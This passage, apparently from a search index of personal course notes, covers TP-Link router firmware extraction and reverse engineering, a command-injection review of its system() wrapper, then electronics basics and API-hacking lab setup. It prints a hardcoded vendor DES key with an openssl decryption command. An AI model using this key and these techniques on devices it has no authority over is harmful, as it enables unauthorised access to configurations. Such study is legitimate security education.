util_execSystem ] 141:  oal_wlan_ra_setSec cmd is \"iwpriv ra0 set EncrypType=AES\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setSec cmd is \"iwpriv ra0 set IEEE8021X=0\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setSec cmd is \"iwpriv ra0 set DefaultKeyID=2\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setSec cmd is \"iwpriv ra0 set SSID='i''o''t''h''a''c''k''i''n''g'\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setSec cmd is \"iwpriv ra0 set RekeyInterval=0\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setSec cmd is \"iwpriv ra0 set WPAPSK='1''2''3''4''5''q''w''e''r''t'\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_updateWlanCfg cmd is \"iwpriv ra0 set AccessPolicy=0\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_updateWlanCfg cmd is \"iwpriv ra0 set SSID='i''o''t''h''a''c''k''i''n''g'\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_updateWlanCfg cmd is \"ifconfig ra1 down\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_updateWlanCfg cmd is \"ifconfig ra0 down; \"</p> <p>br0: port 1(ra0) entering forwarding state [ util_execSystem ] 141:  oal_wlan_ra_updateWlanCfg cmd is \"ifconfig ra0 up; \"</p> <p>[RTMPReadParametersHook:297]wifi read profile faild. efuse_probe: efuse = 10000012 exec! spiflash_ioctl_read, Read from 0x003f0000 length 0x400, ret 0, retlen 0x400 eeFlashId = 0x7628! tx or rx disable[f0000300][count=0]!!! tx or rx disable[f0000300][count=1]!!! tssi_1_target_pwr_g_band = 36 [ ntp_start ] 504:  ntp connect failed, return.</p> <p>[APCheckBcnQHandler] check_point_num  5 == 4  ARB_SCR=[f0000001] br0: port 1(ra0) entering forwarding state br0: port 1(ra0) entering forwarding state [ util_execSystem ] 141:  oal_intf_setIntf cmd is \"ifconfig br0 192.168.0.1 netmask 255.255.255.0 up\"</p> <p>[ util_execSystem ] 141:  oal_util_setProcLanAddr cmd is \"echo \"br0 16820416,\" &gt; /proc/net/conntract_LocalAddr\"</p> <p>[ util_execSystem ] 141:  oal_sys_unsetTZ cmd is \"echo \"\" &gt; /etc/TZ\"</p> <p>iptables: Bad rule (does a matching rule exist in that chain?). spiflash_ioctl_read, Read from 0x003e0000 length 0x10000, ret 0, retlen 0x10000 . spiflash_ioctl_erase, erase to 0x003f0000 length 0x0, nerase done spiflash_ioctl_write, Write to 0x003e0000 length 0x10000, ret 0, retlen 0x10000</p> <p>Primary investigation showed that some user validation was being performed on the inputs, notably the SSID and Password had their individual characters escaped.</p> <p>Further investigation to be performed by using the function names to trace back and reverse engineering the firmware.</p> <p>Firmware Extraction and Analysis Firmware Extraction from onboard ROM From the previous recon, it was confirmed that the flash ROM on the board (EN25Q32B-104HIP) was using SPI to communicate with the processor, to confirm this a logic analyzer was attached to the pins of the ROM using test clips.</p> <p>The initial boot process was captured as this process contains many reads from the processor to the flash ROM. The logic analyzer confirmed the SPI function of the flash ROM matched that of the datasheet.</p> <p>After confirming the SPI flash functioned as expected a ch341a flash programmer was connected to the flash ROM as per the data sheet pinout in order to read the entire contents of the flash ROM.</p> <p>The firmware was then extracted from the ROM using flashrom and the following command:</p> <p>flashrom -p ch341a_spi -r tp_link_wr841n_ext.bin</p> <p>Firmware Analysis To confirm the firmware extraction was successful an initial analysis was performed on it using binwalk with the following command:</p> <p>binwalk tp_link_wr841n_ext.bin</p> <p>The initial analysis by binwalk showed that the extraction appeared to be successful as it was able to pickout three partitions on the firwmare that very closely matched the partition table that was previously observed during bootup.</p> <p>As an additional confirmation, the entropy of the file was analyzed using binwalk.</p> <p>binwalk -E tp_link_wr841n_ext.bin</p> <p>The entropy confirmed the layout of the firmware matched what was expected on the ROM. The first partition was clearly the unencrypted/uncompressed bootloader as the entropy was floating around 0.5.</p> <p>The second partition matched the starting address location and length of the kernel. The entropy being around a solid 1 confirms that it is LZMA compressed as was shown by binwalk.</p> <p>The third partition also matched the starting address location and length of the root file system, in addition the entropy shows that it is in fact compressed as well.</p> <p>An additional partition or section of data is visible in the entropy analysis that binwalk was not able to identify previously, this most likely indicates an encrypted section.</p> <p>Binwalk was then used to automatically extract the contents of the firmware.</p> <p>binwalk -e tp_link_wr841n_ext.bin</p> <p>The automatic extraction by binwalk was able to carve out the LZMA compressed kernel and squashfs filesystem and then automatically decompress both of the files.</p> <p>As binwalk was not able to automatically extract the bootloader it was extracted manually using dd.</p> <p>dd if=tp_link_ext.bin bs=1 skip=53536 count=12512 of=u_boot.bin</p> <p>After extracting the root file system the contents of it were enumerated which revealed multiple binaries and shared object files that may be of interest to reverse engineer. In addition, two config files called default_config.xml and reduced_data_model.xml were located however these config files appear to be encrypted.</p> <p>Strings was then used to identify any binaries or shared object files that had the above xml file names as strings in them to identify which files to reverse engineer in an attempt to decrypt them.</p> <p>strings -f * | grep \".xml\"</p> <p>This revealed that the libcmm.so shared object file had both the xml file names as strings in it.</p> <p>Locating the Decryption Algorithm and Key The libcmm.so was loaded in Ghidra and decompiled in an attempt to reverse engineer the encryption/decryption of the xml files.</p> <p>Running a search for \"decrypt\" in Ghidra revealed a function called \"dm_decryptFile\" that was then investigated further.</p> <p>Upon initial inspection of the decompiled, based on the error messaging this appeared to be the correct function to decrypt the config files.</p> <p>Some variables were renamed based on guesses of their function based on the decompiled code.</p> <p>int dm_decryptFile(uint dm_file_size,undefined4 param_2,uint dec_buf_size,int param_4)</p> <p>{ int iVar1; int iVar2; char enc_key [8];</p> <p>memcpy(enc_key,&amp;DAT_000c9f70,8); if (dec_buf_size &lt; dm_file_size) {     cdbg_printf(8,\"dm_decryptFile\",0xbcf,                 \"Buffer exceeded, decrypt buf size is %u, but dm file size is %u\",dec_buf_size,                 dm_file_size);     iVar2 = 0; } else {     iVar2 = cen_desMinDo(param_2,dm_file_size,param_4,dec_buf_size,enc_key,0);     iVar1 = iVar2;     if (iVar2 == 0) {     cdbg_printf(8,\"dm_decryptFile\",0xbd6,\"DES decrypt error\\n\");     }     else {     do {         iVar2 = iVar1;         if (((undefined )(param_4 + iVar2))[-1] != '\\0') break;         iVar1 = iVar2 + -1;     } while (iVar2 != 0);     (undefined *)(param_4 + iVar2) = 0;     } } return iVar2;</p> <p>Reverse engineering of the function revealed that based on the error messaging and the cen_desMinDo() function the encryption algorithm appears to be DES. Further research on the DES algorithm reveals that it uses 64-bit (8 x 8 bytes) keys. An array of 8 chars was noted to be created at the start of the function and then memcpy is later used to copy 8 bytes into it from a data location in the .data section of the shared object file. Inspecting the data location revealed what appears to be the DES encryption key. As DES is a symmetric encryption algorithm it can also be used for decryption.</p> <p>DES Encryption Key: 478DA50FF9E3D2CB</p> <p>The default_config.xml file was then decrypted using OpenSSL and the above key.</p> <p>openssl enc -d -des-ecb -K 478DA50FF9E3D2CB -nopad -in default_config.xml</p> <p>Unfortunately, this config file did not contain any notable details.</p> <p>The reduced_data_model.xml config file was then decrypted making use of Cyberchef (https://cyberchef.io/).</p> <p>It also did not contain any notable details but confirmed that it was using the same encryption key and scheme as the previous xml file.</p> <p>Checking for command injection Based on the previous testing performed on the web portal and reviewing the console logging in UART it appears that some of the functions of the router are being performed by making system calls to execute bash commands. More specifically it appears that some of these system calls are being passed user supplied inputs from the web portal.</p> <p>Initial recon showed that some of the user supplied inputs were at a minimum being escaped as individual characters to prevent command injection, however use of system calls on user supplied inputs can lead to command injection.</p> <p>The util_execSystem function which appeared to be the one performing the system calls was located to be part of the libcmm.so shared object file by using strings to search for it through the binaries and other shared object files.</p> <p>strings -f * | grep \"util_execSystem\"</p> <p>The util_execSystem function was then found via a program text search in Ghidra using the previously decompiled libcmm.so that was investigated above.</p> <p>int util_execSystem(int cmd_id,char *unformat_string,undefined4 str_format_var_1,                 undefined4 str_format_var_2)</p> <p>{ char pcVar1; __pid_t _Var2; uint uVar3; undefined4 uVar4; int iVar5; int iVar6; undefined4 va_ptr_format_var; undefined4 va_end_format_var; uint local_234; char cmd_string [512]; int local_30; char cmd_string_ptr;</p> <p>cmd_string_ptr = cmd_string; local_234 = 0; va_ptr_format_var = str_format_var_1; va_end_format_var = str_format_var_2; memset(cmd_string_ptr,0,0x200); local_30 = vsnprintf(cmd_string_ptr,0x1ff,unformat_string,&amp;va_ptr_format_var); cdbg_printf(8,\"util_execSystem\",0xb9,\"%s cmd is \\\"%s\\\"\\n\",cmd_id,cmd_string_ptr); iVar5 = 1; if (0 &lt; local_30) {     while( true ) {     local_234 = system(cmd_string);     uVar3 = local_234 &amp; 0x7f;     if ((int)local_234 &lt; 0) {         if (local_234 == 0xffffffff) {         cdbg_printf(8,\"util_execSystem\",0xcd,\"system fork failed.\",cmd_id,cmd_string_ptr);         }         else {         perror(\"util_execSystem call error:\");         }     }     else if (uVar3 == 0) {         iVar6 = (int)(local_234 &amp; 0xff00) &gt;&gt; 8;         if (iVar6 == 0) {         return 0;         }         if (iVar6 != 4) {         return iVar6;         }         pcVar1 = strstr(cmd_string,\"iptable\");         if (pcVar1 == (char )0x0) {         return 4;         }         sleep(1);     }     else {         if ((int)((uVar3 + 1) * 0x1000000) &gt;&gt; 0x19 &lt; 1) {         if ((local_234 &amp; 0xff) == 0x7f) {             uVar4 = 0xe6;             pcVar1 = \"process stopped, signal number = %d\\n\";             uVar3 = (int)(local_234 &amp; 0xff00) &gt;&gt; 8;         }         else {             uVar4 = 0xe8;             pcVar1 = \"Oh,no possible here. status = %d\\n\";             uVar3 = local_234;         }         }         else {         uVar4 = 0xe4;         pcVar1 = \"abnormal termination, signal number = %d\\n\";         }         cdbg_printf(8,\"util_execSystem\",uVar4,pcVar1,uVar3,cmd_string_ptr);         while (_Var2 = waitpid(-1,(int )&amp;local_234,1), 0 &lt; _Var2) {         cdbg_printf(8,\"util_execSystem\",0xee,\"get a zombie process %d\",_Var2);         }     }     if (iVar5 == 3) break;     cmd_id = iVar5;     cdbg_printf(8,\"util_execSystem\",199,\"system execute again, and %d times\",iVar5);     iVar5 = iVar5 + 1;     } } return -1; }</p> <p>A review of the decompiled source code revealed that the function was in fact making system calls. The only formatting being performed on the inputs to the function which were passed to the system call was to format the specified arguments into the command string using the vsnprintf function. No further validation appeared to be performed in the util_execSystem function on the string created which would then be passed into the system call. This finding demonstrates that all validation or checking of user inputs for things like command injection characters or escaping characters must be done by whatever calls the util_execSystem.</p> <p>Previously the Wireless Setup was run and the user-specified SSID and PSK were passed onto the util_execSystem however the debugging messages shown in the UART console logs showed that the user specified values had each individual character escaped by single quotation marks. This is done to prevent command injection as any characters such as \";\" or \"&amp;\" will only be interpreted as a string and not as part of the command.</p> <p>Further investigation was done to see how this escaping was performed. In order to locate the file or binary that was making the specific util_execSystem call that was printing the debug message seen earlier strings and grep were used to search for words in the string (keeping in mind the formatting of the input string performed by the util_execSystem function itself. The string used that matched the formatting previously seen in the util_execSystem function was found again in the libcmm.so shared object.</p> <p>Searching for the string making use of the strings search in Ghidra led to the function that appeared to be calling util_execSystem to update the SSID when the wireless setup was being performed in the previous test.</p> <p>The string had 9 references to it in the rest of the libcmm.so, following the first external reference luckily led to the correct function that was performing the util_execSystem call from the previous wireless setup test. Unfortunately, this function had its label (name) removed in the compilation process and as such Ghidra added the generic FUN_XXXX label to it.</p> <p>int FUN_000aa1e8(int param_1,undefined4 param_2,char *param_3,int param_4,undefined4 unsan_ssid)</p> <p>{ int iVar1; undefined4 uVar2; char pcVar3; int local_1c0; int local_1bc; char acStack_1b8 [12]; char acStack_1ac [20]; undefined auStack_198 [32]; undefined auStack_178 [32]; undefined SSID [100]; undefined auStack_f4 [196]; char local_30;</p> <p>local_1bc = 1; local_1c0 = 1; cstr_strncpy(auStack_178,&amp;DAT_000c1e4c,0xc); cstr_strncpy(auStack_198,&amp;DAT_000c302c,4); iVar1 = oal_wlan_getSecMode(param_1,&amp;local_1bc,&amp;local_1c0); if (iVar1 == 0) {     if (local_1bc - 1U &lt; 0xb) {                     / WARNING: Could not find normalized switch variable to match jumptable /                     / WARNING: This code block may not be properly labeled as switch case /     strcpy(acStack_1ac,\"OPEN\");     }     uVar2 = 2;     if (local_1c0 - 1U &lt; 5) {                     / WARNING: Could not find normalized switch variable to match jumptable /                     / WARNING: This code block may not be properly labeled as switch case /     uVar2 = 2;     strcpy(acStack_1b8,\"NONE\");     }     else if (local_1c0 == 2) {     uVar2 = (undefined4 )(param_1 + 0x17c);     }     iVar1 = strcmp(\"Up\",param_3);     if (iVar1 != 0) {     return 0;     }     util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set AuthMode=%s\",param_2,acStack_1ac);     util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set EncrypType=%s\",param_2,acStack_1b8);     util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set IEEE8021X=0\",param_2);     if (local_1c0 == 2) {     if ((char )(param_1 + 0x180) != '\\0') {         FUN_000aa13c(auStack_f4,param_1 + 0x180);         util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set Key1=%s\",param_2,auStack_f4);     }     if ((char )(param_1 + 0x210) != '\\0') {         FUN_000aa13c(auStack_f4,param_1 + 0x210);         util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set Key2=%s\",param_2,auStack_f4);     }     if ((char )(param_1 + 0x2a0) != '\\0') {         FUN_000aa13c(auStack_f4,param_1 + 0x2a0);         util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set Key3=%s\",param_2,auStack_f4);     }     if ((char )(param_1 + 0x330) != '\\0') {         FUN_000aa13c(auStack_f4,param_1 + 0x330);         util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set Key4=%s\",param_2,auStack_f4);     }     }     util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set DefaultKeyID=%d\",param_2,uVar2);     if (local_1c0 - 1U &lt; 2) {     return 0;     }     FUN_000aa13c(SSID,unsan_ssid);     util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set SSID=%s\",param_2,SSID);     util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set RekeyInterval=%d\",param_2,                     (undefined4 )(param_1 + 0xf0));     if ((((local_1bc - 6U &lt; 2) || (local_1bc == 9)) || (local_1bc == 10)) || (local_1bc == 0xb)) {     FUN_000aa13c(auStack_f4,param_1 + 0xae);     util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set WPAPSK=%s\",param_2,auStack_f4);     return 0;     }     iVar1 = oal_wlan_getBrNamebyIfName(param_4,param_4,auStack_198);     if (iVar1 == 0) {     iVar1 = oal_wlan_getIfAddr(auStack_198,auStack_178);     if (iVar1 == 0) {         local_30 = \"bObj\";         iVar1 = strcmp(\"2.4GHz\",(char )(param_4 + 1099));         if (iVar1 == 0) {         pcVar3 = \"killall -q  -SIGINT rt2860apd\";         }         else {         pcVar3 = \"killall -q  -SIGINT rtinicapd\";         }         util_execSystem(\"oal_wlan_ra_setSec\",pcVar3);         util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set IEEE8021X=0\",param_2);         util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set SSID=%s\",param_2,SSID);         util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set RADIUS_Server=%s\",param_2,param_1 + 0xf4                     );         util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set RADIUS_Port=%d\",param_2,                         (undefined4 )(param_1 + 0x134));         FUN_000aa13c(auStack_f4,param_1 + 0x138);         util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set RADIUS_Key=%s\",param_2,auStack_f4);         util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set EAPifname=%s\",param_2,auStack_198);         util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set own_ip_addr=%s\",param_2,auStack_178);         util_execSystem(\"oal_wlan_ra_setSec\",\"iwpriv %s set SSID=%s\",param_2,SSID);         sleep(4);         iVar1 = strcmp(\"2.4GHz\",(char )(param_4 + 1099));         if (iVar1 == 0) {         pcVar3 = \"rt2860apd &amp;\";         }         else {         pcVar3 = \"rtinicapd &amp;\";         }         util_execSystem(\"oal_wlan_ra_setSec\",pcVar3);         return 0;     }     uVar2 = 0xbb2;     }     else {     uVar2 = 0xbad;     } } else {     uVar2 = 0xb10; } cdbg_perror(\"oal_wlan_ra_setSec\",uVar2,iVar1); return iVar1; }</p> <p>The util_execSystem function call in reference was located using the specific formatting string \"iwpriv %s set SSID=%s\" that was previously found.</p> <p>The parameters being passed into the function lined up with what was expected from the investigation of the util_execSystem function. The last parameter was clearly the SSID, searching through the rest of the function for more references to the SSID variable showed that above the util_execSystem call in question another function \"FUN_000aa13c\" was called and passed the SSID variable.</p> <p>Following the function in libcmm.so showed that the function was responsible for performing the character escaping on the SSID.</p> <p>void FUN_000aa13c(int param_1,char *param_2)</p> <p>{ char cVar1; size_t sVar2; undefined *puVar3; int iVar4; int iVar5;</p> <p>sVar2 = strlen(param_2); iVar4 = 0; for (iVar5 = 0; puVar3 = (undefined )(param_1 + iVar4), iVar5 &lt; (int)sVar2; iVar5 = iVar5 + 1) {     if (param_2 == '\\'') {     puVar3 = 0x5c;     iVar4 = iVar4 + 2;     puVar3[1] = param_2;     }     else {     puVar3 = 0x27;     cVar1 = param_2;     iVar4 = iVar4 + 3;     puVar3[2] = 0x27;     puVar3[1] = cVar1;     }     param_2 = param_2 + 1; } *puVar3 = 0; return; }</p> <p>A review of the function indicated that it iterated over the unsanitized SSID and performed individual character escaping by first checking if the character was already a single quote and if it was adding the c escape character \"\" in front of it. It then padded each individual character by shifting a single quotation \"'\" in front of and behind each character.</p> <p>This function was also called prior to the util_execSystem call that used the PSK specified by the user.</p> <p>The character escaping appears to be properly implemented so this specific call of the util_execSystem does not appear vulnerable to command injection, however, Ghidra noted that there are 510 references to the function inside the libcmm.so file. Upon initial inspection, many of these appear to be other functions that are calling util_execSystem. These functions should be reviewed to check if there is any way to pass unsanitized user inputs into the util_execSystem function.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#section-1-electrical-engineering-for-hackers-101","title":"Section 1 - Electrical Engineering For Hackers 101","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#what-is-electricity","title":"What is Electricity","text":"<p>Nucleus is at the center of the Atom and is made up of - Proton (Positive charge) - Neutron (No charge) - Electron (Negative charge). much lighter and is around the Nucleus</p> <p>Electrons flow from a negative electrode to a positive electrode as a result of a potential difference between them.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#electrical-engineering-fundamentals-schematics-voltage-source-resistors-and-ohms-law","title":"Electrical Engineering Fundamentals: Schematics, Voltage Source, Resistors and Ohm's Law","text":"<ul> <li>Schematics:</li> <li>Visual representation of a Circuit.</li> <li>Current:</li> <li>Series Circuit:<ul> <li>All components are connected end-to-end, forming a single path for current flow.</li> <li>Current remains at the same value through out a circuit.</li> <li></li> <li>ohms-law calculator</li> </ul> </li> <li>Parallel Circuit: <ul> <li>All components are connected across each other, forming exactly two sets of electrically common points.</li> <li>Each individual path is called a Branch</li> <li></li> <li>parallel-resistance calculator</li> </ul> </li> <li>voltage:</li> <li>Series Circuit:<ul> <li>Drops across resistor(s).</li> </ul> </li> <li>Parallel Circuit:<ul> <li>Remains constant across a circuit.</li> </ul> </li> <li>Resistor:</li> <li>Electrical Power is absorbed by a resistance as it is the product of voltage and current with some resistances converting this power into heat.</li> <li>Resistors Wattage Rating and is defined as the amount of heat that a resistive element can dissipate for an indefinite period of time without degrading its performance.</li> <li>Resistor color code calculator</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#standard-electrical-units-of-measure","title":"Standard Electrical Units of Measure","text":"Electrical Parameter Measuring Unit Symbol Description X Voltage Volt V or E Unit of Electrical Potential V = I \u00d7 R Pressure that triggers electron flow Current Ampere I or i Unit of Electrical Current I = V \u00f7 R Rate of electron flow, I = intensity Resistance Ohm R or \u03a9 Unit of DC Resistance R = V \u00f7 I Flow inhibitor, \u03a9 = Greek letter omega Conductance Siemen G or \u2127 Reciprocal of Resistance G = 1 \u00f7 R Capacitance Farad C Unit of Capacitance C = Q \u00f7 V Charge Coulomb Q Unit of Electrical Charge Q = C \u00d7 V Inductance Henry L or H Unit of Inductance VL = -L(di/dt) Power Watts W Unit of Power P = V \u00d7 I  or  I2 \u00d7 R Impedance Ohm Z Unit of AC Resistance Z2 = R2 + X2 Frequency Hertz Hz Unit of Frequency \u0192 = 1 \u00f7 T <p>1kV = 1 kilo-volt  \u2013  which is equal to 1,000 Volts. 1mA = 1 milli-amp  \u2013  which is equal to one thousandths (1/1000) of an Ampere. 47k\u03a9 = 47 kilo-ohms  \u2013  which is equal to 47 thousand Ohms. 100uF = 100 micro-farads  \u2013  which is equal to 100 millionths (100/1,000,000) of a Farad. 1kW = 1 kilo-watt  \u2013  which is equal to 1,000 Watts. 1MHz = 1 mega-hertz  \u2013  which is equal to one million Hertz.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#ohms-law","title":"ohms law","text":"<p>Voltage (E in Volts) = Current (I in Amps A) X Resistance (R in Ohms \u03a9) V = I * R</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#kirchhoff-voltage-law-and-the-conservation-of-energy","title":"Kirchhoff voltage law and the Conservation of Energy","text":"<p>For a closed loop series path the algebraic sum of all the voltages around any closed loop in a circuit is equal to zero. This is because a circuit loop is a closed conducting path so no energy is lost.</p> <p>Calculations can be checked here kirchhoffs-voltage-law</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#kirchhoffs-current-law-kcl","title":"Kirchhoff\u2019s Current Law (KCL)","text":"<p>Deals with the conservation of charge entering and leaving a junction.</p> <p>Parallel Circuit</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#circuit-lab-simulation-demo","title":"Circuit Lab Simulation Demo","text":"<p>Circuit Lab</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#section-challenge-solution","title":"Section Challenge Solution","text":"<p>Voltage Divider</p> <p></p> <p></p> <p></p> <p></p> <p>We can check Standard Electronic Decade Value Tables to fin dthe closest resistor</p> <p></p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#section-2-hands-on-with-pcbs-and-multimeters","title":"Section 2 - Hands on with PCBs and Multimeters","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#section-3-electrical-engineering-for-hackers-201","title":"Section 3 - Electrical Engineering for Hackers 201","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#section-4-hands-on-with-logic-analyzers-and-uart","title":"Section 4 - Hands on with Logic Analyzers and UART","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#section-5-initial-recon-and-osint","title":"Section 5 - Initial Recon and OSINT","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#section-6-uart-shell-and-live-enumeration","title":"Section 6 - UART Shell and Live Enumeration","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#section-7-spi-and-firmware-extractionanalysis","title":"Section 7 - SPI and Firmware Extraction/Analysis","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#section-8-reverse-engineering-firmware","title":"Section 8 - Reverse Engineering Firmware","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#section-9-end-of-course-challenge-and-course-wrap-up","title":"Section 9 - End of Course Challenge and Course Wrap-Up","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#sources","title":"Sources","text":"<ul> <li>electronics-tutorials</li> <li>allaboutcircuits</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Mobile_Application_Penetration_Testing/","title":"Mobile Application Penetration Testing","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Mobile_Application_Penetration_Testing/#resources","title":"Resources","text":"<ul> <li>Mobile Pentesting OWASP Gitbook</li> <li>OWASP Mobile Top 10</li> <li>SecJuice Intro to Frida &amp; Objection</li> <li>HackTricks Checklist (Android)</li> <li>HackTricks Checklist (iOS)</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Mobile_Application_Penetration_Testing/#certifications","title":"Certifications","text":"<ul> <li>eLearnSecurity Mobile Application Penetration Tester</li> <li>SANS Institute GMOB</li> <li>EC-Council (Android Pentesting Certificate)</li> <li>Infosec Institute CMWAPT</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Mobile_Application_Penetration_Testing/#device-requirements","title":"Device Requirements","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Mobile_Application_Penetration_Testing/#penetration-testing-process","title":"Penetration Testing Process","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Mobile_Application_Penetration_Testing/#the-penetration-testing-process","title":"The Penetration Testing Process","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Mobile_Application_Penetration_Testing/#the-mobile-application-penetration-testing-process","title":"The Mobile Application Penetration Testing Process","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Mobile_Application_Penetration_Testing_Summary/","title":"Mobile Application Penetration Testing Summary","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Mobile_Application_Penetration_Testing_Summary/#resources","title":"Resources","text":"<ul> <li>Mobile Pentesting OWASP Gitbook</li> <li>OWASP Mobile Top 10</li> <li>SecJuice Intro to Frida &amp; Objection</li> <li>HackTricks Checklist (Android)</li> <li>HackTricks Checklist (iOS)</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/","title":"Practical API Hacking","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#introduction","title":"Introduction","text":"<p>API Application Programming Interface</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#interacting-with-apis","title":"Interacting with APIs","text":"<p>API to play with https://catfact.ninja/ </p> <p>To call API and get a fact https://catfact.ninja/fact</p> <p>The API get /fact has a Parameter that we can test  ]</p> <p>Test the Parameter https://catfact.ninja/fact?max_length=50</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#api-types","title":"API Types","text":"<ul> <li>REST (Client Server Arch., Stateless, uses HTTP methods)</li> <li>Public</li> <li>Partner (shared between a number of companies)</li> <li>Private (used in a single Organization)</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#http-methods","title":"HTTP Methods","text":"<ul> <li>Get</li> <li>Head</li> <li>Post</li> <li>Delete</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#lab-setup","title":"Lab Setup","text":"<ul> <li> <p>pimpmykali</p> <p>To easily install the required tools (such as docker-compose) and crAPI lab, simply clone this repository and run it with the option \"O\".</p> <pre><code>git clone https://github.com/Dewalt-arch/pimpmykali\n./pimpmykali.sh O\n</code></pre> </li> <li> <p>postman https://www.postman.com/downloads/</p> </li> <li> <p>Burp Suite https://portswigger.net/burp/communitydownload</p> </li> <li>FoxyProxy extension for Firefox</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#enumerating-apis","title":"Enumerating APIs","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#fuzzing-apis","title":"Fuzzing APIs","text":"<p>Good resource for THM Bookstore Room Bookstore writeup</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#discovery-via-source-code","title":"Discovery via Source code","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#attacking-authorization","title":"Attacking Authorization","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#attacking-authentication","title":"Attacking Authentication","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#injection","title":"Injection","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#mid-course-capstone","title":"Mid-course Capstone","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#mass-assignment","title":"Mass Assignment","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#excessive-data-exposure","title":"Excessive Data Exposure","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#ssrf-server-side-request-forgery","title":"SSRF - Server-side Request 